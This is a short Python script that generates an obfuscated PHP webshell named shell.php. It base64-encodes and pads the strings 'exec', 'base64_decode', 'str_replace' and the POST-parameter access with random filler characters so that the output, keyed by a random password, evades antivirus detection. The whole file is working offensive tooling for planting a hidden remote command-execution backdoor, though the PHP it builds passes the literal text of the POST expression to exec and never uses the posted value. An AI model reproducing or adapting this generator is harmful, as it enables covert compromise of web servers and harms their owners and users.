import string
import random
import base64

def character_encode(replace_string, length, confusing_characters = ""):
    encoding_string = ""
    if confusing_characters == "":
        confusing_characters = "".join(random.sample(string.ascii_letters+string.digits, length))
    while True:
        rand_len = int(random.randint(1, 4))
        if(len(replace_string) <= rand_len):
            encoding_string += replace_string + confusing_characters
            break;
        encoding_string += replace_string[:rand_len] + confusing_characters
        replace_string = replace_string[rand_len:]
    return encoding_string, confusing_characters


def free_kill():
    decode_string = character_encode("base64_decode", 50)
    replace_string = character_encode("str_replace", 50)
    fun = character_encode(base64.b64encode("exec".encode('utf-8')).decode('utf-8'), 50)
    ph_1 = character_encode(base64.b64encode("$_POST['".encode('utf-8')).decode('utf-8'), 50)
    ph_2 = character_encode(base64.b64encode("'];".encode('utf-8')).decode('utf-8'), 50)

    keys = ''.join(random.sample(string.ascii_letters+string.digits, 4))
    # print(keys)
    
    with open("./shell.php","w+") as f:
        statement = f"""<?php
$rep = str_replace("{replace_string[1]}", "", "{replace_string[0]}");
$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
$p_2 = "{keys}";
$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
$func($p_1.$p_2.$p_3);
?>"""
        f.write(statement)
        f.close()


if __name__ == "__main__":
    free_kill()